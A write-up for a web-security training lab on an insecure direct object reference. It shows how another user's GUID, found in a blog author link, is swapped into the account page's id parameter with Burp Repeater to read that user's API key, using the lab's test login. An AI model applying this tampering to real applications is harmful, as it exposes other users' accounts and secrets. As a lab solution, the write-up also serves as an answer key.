# Lab: User ID Controlled by Request Parameter, with Unpredictable User IDs

## Objective

Identify the GUID associated with the user `carlos`, retrieve his API key, and submit it as the solution.

## Vulnerability

The application uses GUIDs to identify users instead of predictable usernames. However, it fails to enforce proper authorization checks when processing the `id` parameter. As a result, an attacker who obtains another user's GUID can access that user's account information, leading to a horizontal privilege escalation vulnerability.

## Steps

1. Browse the website and locate a blog post authored by `carlos`.
2. Click on the author's name and observe that the URL contains Carlos's GUID.
3. Make a note of the user ID.

### User Profile URL

```http id="gwx5n3kq"
GET /blogs?userId=<carlos-guid> HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

4. Log in using the provided credentials:

```text id="mukvdfyc"
Username: wiener
Password: peter
```

5. Navigate to the account page and observe that the URL contains your own user ID.

### Original Request

```http id="0p9i7tn4"
GET /my-account?id=<wiener-guid> HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Cookie: session=<session-cookie>
```

6. Send the request to **Burp Repeater**.
7. Replace your GUID with the GUID belonging to `carlos`.

### Modified Request

```http id="xltcbr7w"
GET /my-account?id=<carlos-guid> HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Cookie: session=<session-cookie>
```

8. Send the modified request.
9. Observe that the response contains the account details and API key associated with `carlos`.
10. Copy the API key and submit it to solve the lab.



The API key belonging to `carlos` is successfully retrieved, demonstrating that the application fails to enforce authorization checks on user identifiers, even when unpredictable GUIDs are used.

## Payload Used

```text id="c8j1x3af"
id=<carlos-guid>
```
